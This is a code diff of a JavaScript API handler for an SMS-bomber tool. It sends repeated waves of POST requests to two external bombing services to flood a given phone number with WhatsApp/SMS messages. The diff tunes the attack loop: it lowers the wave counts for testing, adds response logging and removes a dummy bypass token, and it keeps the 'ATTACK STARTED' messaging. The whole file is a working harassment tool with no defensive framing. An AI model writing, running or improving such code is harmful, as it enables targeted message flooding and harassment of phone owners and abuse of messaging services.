@@ -5,45 +5,41 @@ export default async function handler(req, res) {
 
   const { number, amount, isUltimate } = req.body;
 
-  // Target Links
   const targetLinks = [
     'https://shadowx-sms-bomber.onrender.com/',
     'https://nuke-sms-bomber.pages.dev/'
   ];
 
   const runAttack = async () => {
-    const totalWaves = isUltimate ? 100 : amount; 
-    const delay = isUltimate ? 500 : 2000; 
+    const totalWaves = isUltimate ? 10 : amount; // Test er jonno kom rakhi
+    const delay = isUltimate ? 1000 : 3000; 
 
     for (let i = 0; i < totalWaves; i++) {
-      // Amra protibar ekta loop chalabo jate multiple signals jay
-      const attackPromises = targetLinks.map(link => 
-        fetch(link, {
-          method: 'POST',
-          headers: { 
-            'Content-Type': 'application/json',
-            'Accept': 'application/json, text/plain, */*',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Cache-Control': 'no-cache',
-            'Pragma': 'no-cache',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
-            'X-Requested-With': 'XMLHttpRequest',
-            'Origin': link,
-            'Referer': link,
-          },
-          // Ekhane amra Payload ta simulate korchi jate oi site bujhte pare
-          body: JSON.stringify({
-            number: number,
-            amount: 1,
-            country: "BD",
-            service: "whatsapp",
-            msg: "ULTIMATE ATTACK",
-            auth: "true",
-            token: "dummy_token_123", // Dummy token for bypass
-            method: "sms"
-          }),
-        }).catch(err => console.log("Wave Error:", err.message))
-      );
+      const attackPromises = targetLinks.map(async (link) => {
+        try {
+          const response = await fetch(link, {
+            method: 'POST',
+            headers: { 
+              'Content-Type': 'application/json',
+              'Accept': 'application/json',
+              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
+            },
+            body: JSON.stringify({
+              number: number,
+              amount: 1,
+              country: "BD",
+              service: "whatsapp",
+              msg: "Test"
+            }),
+          });
+
+          const result = await response.text(); // Error message check korar jonno
+          console.log(`Link: ${link} | Status: ${response.status} | Response: ${result.substring(0, 50)}`);
+          
+        } catch (err) {
+          console.error(`Link: ${link} | Error: ${err.message}`);
+        }
+      });
 
       await Promise.all(attackPromises);
       await new Promise(resolve => setTimeout(resolve, delay));
@@ -54,6 +50,6 @@ export default async function handler(req, res) {
 
   return res.status(200).json({ 
     success: true, 
-    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK IN PROGRESS! 🔥" 
+    message: "ATTACK STARTED! Check Console for Debugging" 
   });
 }
